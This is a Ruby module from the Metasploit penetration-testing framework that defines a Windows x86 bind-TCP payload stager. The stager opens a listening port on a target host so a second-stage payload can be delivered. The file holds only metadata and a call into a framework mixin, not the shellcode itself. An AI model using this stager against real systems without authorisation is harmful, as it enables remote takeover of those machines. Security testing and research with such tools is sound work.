##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/bind_tcp'
require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/windows/bind_tcp'

module Metasploit4

  CachedSize = 285

  include Msf::Payload::Stager
  include Msf::Payload::Windows::BindTcp

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Bind TCP Stager',
      'Description'   => 'Listen for a connection',
      'Author'        => ['hdm', 'skape', 'sf'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockedi',
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end

  def generate
    generate_bind_tcp
  end

end
